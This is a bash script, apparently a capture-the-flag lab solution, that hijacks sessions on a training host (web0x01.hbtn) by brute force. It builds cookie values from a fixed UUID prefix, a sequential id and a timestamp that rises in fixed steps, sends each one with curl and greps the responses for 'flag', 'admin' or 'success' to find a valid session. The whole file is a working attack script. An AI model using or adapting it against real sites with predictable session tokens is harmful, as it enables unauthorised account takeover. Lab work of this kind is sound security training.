#!/bin/bash

UUID_PREFIX="d3c0b51f-ec52-44d4-881"
START_ID=9643400
END_ID=9643450
BASE_TS=17469904625
INCREMENT=3

TARGET_URL="http://web0x01.hbtn/a1/hijack_session"
COOKIE_NAME="hijack_session"

echo "[DEBUG] Script iniciado..."
for ((id=START_ID; id<=END_ID; id++)); do
    offset=$((id - START_ID))
    ts=$((BASE_TS + offset * INCREMENT))
    COOKIE_VALUE="${UUID_PREFIX}-${id}-${ts}"

    echo "[DEBUG] Probando cookie: $COOKIE_VALUE"

    response=$(curl -s --cookie "$COOKIE_NAME=$COOKIE_VALUE" "$TARGET_URL")

    echo "$response" > "response_$id.html"

    if [[ -n "$response" ]]; then
        echo "[DEBUG] Longitud de respuesta: ${#response}"
        if echo "$response" | grep -iq "flag\|admin\|success"; then
            echo "[+] ¡Sesión válida encontrada!"
            echo "    Cookie: $COOKIE_NAME=$COOKIE_VALUE"
            echo "    Fragmento: $(echo "$response" | grep -i 'flag\|admin\|success')"
            break
        fi
    else
        echo "[DEBUG] No hubo respuesta del servidor."
    fi
done
